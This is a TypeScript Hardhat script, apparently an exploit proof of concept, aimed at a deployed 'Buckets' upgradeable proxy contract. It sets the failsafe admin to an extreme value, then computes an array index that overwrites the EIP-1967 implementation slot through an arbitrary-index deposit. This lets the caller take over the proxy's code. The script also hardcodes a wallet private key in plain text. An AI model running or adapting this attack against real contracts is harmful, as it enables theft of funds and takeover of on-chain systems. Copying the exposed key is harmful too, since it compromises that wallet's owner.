import { ethers } from 'hardhat'
import { BigNumber } from 'ethers'
import { BucketsProxy__factory, Buckets__factory } from '../typechain'
import { ETH_RPC } from '../secrets.config'
import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'

import * as dotenv from 'dotenv'
dotenv.config()

const proxyInstanceAddr = "0x9A848B15f31A36F1B2683E3f20A00ef70C3c2d21"

const providerETH = new ethers.providers.JsonRpcProvider(ETH_RPC)

async function eth() {
  const signer = new ethers.Wallet("1e0d463e0755a9d55c9956d26f991f067bebb7aa92c11c784bb9c3ccb1ad91bc", providerETH);
  const proxyContract = BucketsProxy__factory.connect(proxyInstanceAddr, signer)
  console.log(BNToNumstr(await providerETH.getBalance(proxyInstanceAddr), 18, 3));
  
  const bucketsContract = Buckets__factory.connect(proxyInstanceAddr, signer)
  await proxyContract.setFailsafeAdmin(ethers.constants.MaxUint256)
  
  const implementationSlot = BigNumber.from('0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
  const hashOfZeroSlot = BigNumber.from('0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563')
  const arrayIndexToCheck = implementationSlot.sub(hashOfZeroSlot)

  console.log(await providerETH.getStorageAt(bucketsContract.address, implementationSlot));
  await bucketsContract.deposit(arrayIndexToCheck, {value: 1})
  console.log(await providerETH.getStorageAt(bucketsContract.address, implementationSlot));
  console.log(await bucketsContract.totalSupply());
}

eth()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })